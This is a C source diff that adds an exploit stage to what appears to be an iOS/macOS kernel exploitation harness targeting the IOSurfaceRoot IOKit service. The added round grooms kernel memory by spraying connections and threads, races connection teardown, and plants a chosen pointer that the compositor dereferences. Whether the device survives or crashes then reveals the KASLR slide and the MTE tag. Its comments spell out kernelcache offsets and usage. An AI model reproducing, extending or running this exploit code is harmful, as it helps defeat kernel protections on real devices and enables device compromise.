@@ -20124,7 +20124,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds <= 199) {
+        if (rounds >= 170 && rounds <= 210) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
@@ -23483,6 +23483,292 @@ new_modes:
                 }
 
                 rlog("=== r=197 complete ===\n");
+            }
+
+            if (rounds == 198) {
+                /*
+                 * r=198: KASLR BSS CRASH ORACLE (slot 0)
+                 *
+                 * The compositor walks the registry linked list via slot 0
+                 * (the "next" pointer at +0x00). If slot 0 points to
+                 * all-zero memory, next_ptr reads as 0 → walk terminates → SURVIVE.
+                 * If slot 0 points to non-zero or unmapped → CRASH.
+                 *
+                 * Target: 1.3MB BSS zero region at kernelcache offset 0x047FA208
+                 * (middle of the 1,359,248-byte zero run at kc+0x04754270).
+                 * BSS offset is from build 24A94425; override with arg 4.
+                 *
+                 * MTE: A20 Pro uses ARM MTE. Bits[59:56] of the pointer are
+                 * the MTE tag. Must match memory's tag or we get a tag check
+                 * fault (which reveals the ACTUAL tag in the panic log).
+                 * Default tag: 0xF. Override with arg 5.
+                 *
+                 * Usage: iosurface_sel17 198 <hex_slide> [<hex_bss_off>] [<hex_tag>]
+                 *   e.g.: iosurface_sel17 198 3D540000
+                 *         iosurface_sel17 198 3D540000 047FA208
+                 *         iosurface_sel17 198 3D540000 047FA208 F
+                 *
+                 * Crash outcomes:
+                 *   "data abort"      → unmapped: wrong slide
+                 *   "tag check fault" → mapped, wrong MTE tag: slide MAY be right!
+                 *                       Panic log FAR bits[59:56] = actual memory tag
+                 *   SURVIVE           → correct slide + tag + BSS offset → KASLR FOUND
+                 */
+                rlog("=== r=198: KASLR BSS crash oracle (slot 0) ===\n");
+
+                /* Extend watchdog for this test */
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC),
+                    dispatch_get_global_queue(0, 0), ^{
+                        rlog("  WATCHDOG: 30s — terminating\n");
+                        if (g_log) { fclose(g_log); g_log = NULL; }
+                        _exit(42);
+                    });
+
+                #define BSS_MID_DEFAULT 0x047FA208ULL /* middle of 1.3MB zero run (build 24A94425) */
+                #define R198_KC_BASE    0xFFFFFE0007004000ULL
+
+                uint64_t r198_slide = 0;
+                uint64_t r198_bss_off = BSS_MID_DEFAULT;
+                uint64_t r198_tag = 0xF;
+                int r198_have_slide = 0;
+
+                /* Parse hex slide from argv[3] */
+                if (argc > 3) {
+                    const char *h = argv[3];
+                    r198_slide = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r198_slide <<= 4;
+                        if (c >= '0' && c <= '9') r198_slide |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r198_slide |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r198_slide |= (c - 'A' + 10);
+                    }
+                    r198_have_slide = 1;
+                }
+                /* Parse optional BSS offset from argv[4] */
+                if (argc > 4) {
+                    const char *h = argv[4];
+                    r198_bss_off = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r198_bss_off <<= 4;
+                        if (c >= '0' && c <= '9') r198_bss_off |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r198_bss_off |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r198_bss_off |= (c - 'A' + 10);
+                    }
+                }
+                /* Parse optional MTE tag from argv[5] */
+                if (argc > 5) {
+                    const char *h = argv[5];
+                    r198_tag = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r198_tag <<= 4;
+                        if (c >= '0' && c <= '9') r198_tag |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r198_tag |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r198_tag |= (c - 'A' + 10);
+                    }
+                    r198_tag &= 0xF;
+                }
+
+                if (!r198_have_slide) {
+                    rlog("  ERROR: need slide arg\n");
+                    rlog("  Usage: iosurface_sel17 198 <hex_slide> [<hex_bss_off>] [<hex_tag>]\n");
+                    rlog("  Slide range: 2FAD0000 - 4AFD4000 (16KB aligned)\n");
+                    rlog("  BSS offset default: %llx (build 24A94425)\n",
+                         (unsigned long long)BSS_MID_DEFAULT);
+                    rlog("  Tag default: F\n");
+                    rlog("=== r=198 complete (no test) ===\n");
+                    goto r198_done;
+                }
+
+                /* Construct probe address */
+                uint64_t r198_raw = R198_KC_BASE + r198_slide + r198_bss_off;
+                /* Clear bits[59:56], then set our tag */
+                uint64_t r198_probe = (r198_raw & ~(0xFULL << 56)) | (r198_tag << 56);
+                /* Ensure bits[63:60] = 0xF (kernel canonical) */
+                r198_probe = (r198_probe & ~(0xFULL << 60)) | (0xFULL << 60);
+
+                rlog("  Slide:     0x%llx\n", (unsigned long long)r198_slide);
+                rlog("  BSS off:   0x%llx\n", (unsigned long long)r198_bss_off);
+                rlog("  MTE tag:   0x%llx\n", (unsigned long long)r198_tag);
+                rlog("  KC base:   0x%llx\n", (unsigned long long)R198_KC_BASE);
+                rlog("  Raw addr:  0x%016llx\n", (unsigned long long)r198_raw);
+                rlog("  Probe:     0x%016llx\n", (unsigned long long)r198_probe);
+                rlog("  Expected:  if BSS zeros at this addr → walk terminates → SURVIVE\n");
+                rlog("  Fail mode: data abort (unmapped) or tag check fault (wrong MTE tag)\n");
+
+                /* ---- Phase A: NULL baseline (must survive) ---- */
+                rlog("\n  --- Phase A: NULL baseline ---\n");
+                {
+                    io_service_t r198_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+                    if (!r198_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r198_done; }
+
+                    #define R198_GROOM_N 128
+                    io_connect_t r198_gconns[R198_GROOM_N];
+                    mach_port_t r198_gwps[R198_GROOM_N];
+                    int r198_gn = 0;
+                    for (int g = 0; g < R198_GROOM_N; g++) {
+                        io_connect_t gc = IO_OBJECT_NULL;
+                        if (IOServiceOpen(r198_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            r198_gconns[r198_gn] = gc;
+                            r198_gwps[r198_gn] = gwp;
+                            r198_gn++;
+                        }
+                    }
+                    rlog("  Pre-opened %d groom conns\n", r198_gn);
+
+                    /* NULL groom baseline */
+                    uint64_t r198_safe[4] = {0, 0, 0, 0};
+                    p16_groom_conns = r198_gconns;
+                    p16_groom_wps = r198_gwps;
+                    p16_groom_n = r198_gn;
+                    p16_groom_data = r198_safe;
+
+                    p16_groom_count = 0;
+                    p16_groom_run = 1;
+                    pthread_t r198_bths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r198_bths[t], NULL, p16_groom_spray, NULL);
+                    usleep(1000);
+
+                    uint64_t r198_inp[3] = {1, 2, 3};
+                    io_connect_t r198_bcs[8]; int r198_bhave[8];
+                    for (int i = 0; i < 8; i++) {
+                        r198_bhave[i] = (IOServiceOpen(r198_svc, mach_task_self(), 0,
+                            &r198_bcs[i]) == KERN_SUCCESS);
+                        if (r198_bhave[i]) {
+                            mach_port_t tw = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                            mach_port_insert_right(mach_task_self(), tw, tw,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xAA;
+                            IOConnectCallAsyncMethod(r198_bcs[i], 17, tw, &ref, 1,
+                                NULL, 0, r198_inp, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), tw);
+                        } else r198_bcs[i] = IO_OBJECT_NULL;
+                    }
+
+                    p13_spam_run = 1;
+                    p13_spam_conn = r198_bhave[0] ? r198_bcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t r198_bspam[16];
+                    for (int t = 0; t < 16; t++)
+                        pthread_create(&r198_bspam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int i = 7; i >= 0; i--) {
+                        if (r198_bhave[i]) { IOServiceClose(r198_bcs[i]); r198_bhave[i] = 0; }
+                        usleep(100);
+                    }
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 16; t++) pthread_join(r198_bspam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (r198_bhave[i]) IOServiceClose(r198_bcs[i]);
+                    usleep(2000);
+                    p16_groom_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(r198_bths[t], NULL);
+
+                    rlog("  Baseline groom=%llu\n", (unsigned long long)p16_groom_count);
+
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r198_br;
+                    pthread_create(&r198_br, NULL, p13_render_loop, NULL);
+                    usleep(500000);
+                    p13_render_run = 0;
+                    pthread_join(r198_br, NULL);
+                    rlog("  Baseline NULL: SURVIVED frames=%d\n", p13_render_frames);
+
+                    /* ---- Phase B: REAL PROBE ---- */
+                    rlog("\n  --- Phase B: BSS probe 0x%016llx ---\n",
+                         (unsigned long long)r198_probe);
+                    rlog("  ** If this is the last log line, kernel panicked **\n");
+                    rlog("  ** Check panic log for 'data abort' vs 'tag check fault' **\n");
+
+                    uint64_t r198_pdata[4] = {r198_probe, 0, 0, 0};
+                    p16_groom_data = r198_pdata;
+                    p16_groom_count = 0;
+                    p16_groom_run = 1;
+                    pthread_t r198_pths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r198_pths[t], NULL, p16_groom_spray, NULL);
+                    usleep(1000);
+
+                    io_connect_t r198_pcs[8]; int r198_phave[8];
+                    for (int i = 0; i < 8; i++) {
+                        r198_phave[i] = (IOServiceOpen(r198_svc, mach_task_self(), 0,
+                            &r198_pcs[i]) == KERN_SUCCESS);
+                        if (r198_phave[i]) {
+                            mach_port_t tw = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                            mach_port_insert_right(mach_task_self(), tw, tw,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xCC;
+                            IOConnectCallAsyncMethod(r198_pcs[i], 17, tw, &ref, 1,
+                                NULL, 0, r198_inp, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), tw);
+                        } else r198_pcs[i] = IO_OBJECT_NULL;
+                    }
+
+                    p13_spam_run = 1;
+                    p13_spam_conn = r198_phave[0] ? r198_pcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t r198_pspam[16];
+                    for (int t = 0; t < 16; t++)
+                        pthread_create(&r198_pspam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int i = 7; i >= 0; i--) {
+                        if (r198_phave[i]) { IOServiceClose(r198_pcs[i]); r198_phave[i] = 0; }
+                        usleep(100);
+                    }
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 16; t++) pthread_join(r198_pspam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (r198_phave[i]) IOServiceClose(r198_pcs[i]);
+                    usleep(2000);
+                    p16_groom_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(r198_pths[t], NULL);
+
+                    rlog("  Probe groom=%llu\n", (unsigned long long)p16_groom_count);
+
+                    /* THE MOMENT OF TRUTH: render loop dereferences slot 0 */
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r198_pr;
+                    pthread_create(&r198_pr, NULL, p13_render_loop, NULL);
+
+                    /* Wait 10 seconds — if we survive, the probe hit zeros */
+                    for (int s = 0; s < 10; s++) {
+                        usleep(1000000);
+                        rlog("  +%ds alive, frames=%d\n", s + 1, p13_render_frames);
+                    }
+
+                    p13_render_run = 0;
+                    pthread_join(r198_pr, NULL);
+
+                    rlog("\n  ****************************************************\n");
+                    rlog("  ** SURVIVED 10 SECONDS! KASLR SLIDE FOUND! **\n");
+                    rlog("  ** Slide: 0x%llx **\n", (unsigned long long)r198_slide);
+                    rlog("  ** Tag:   0x%llx **\n", (unsigned long long)r198_tag);
+                    rlog("  ** Probe: 0x%016llx **\n", (unsigned long long)r198_probe);
+                    rlog("  ** KC base (slid): 0x%016llx **\n",
+                         (unsigned long long)(R198_KC_BASE + r198_slide));
+                    rlog("  ****************************************************\n");
+
+                    /* Cleanup */
+                    for (int g = 0; g < r198_gn; g++) {
+                        IOServiceClose(r198_gconns[g]);
+                        mach_port_deallocate(mach_task_self(), r198_gwps[g]);
+                    }
+                    IOObjectRelease(r198_svc);
+                }
+                r198_done:
+                rlog("=== r=198 complete ===\n");
             }
 
             IOServiceClose(conn17);
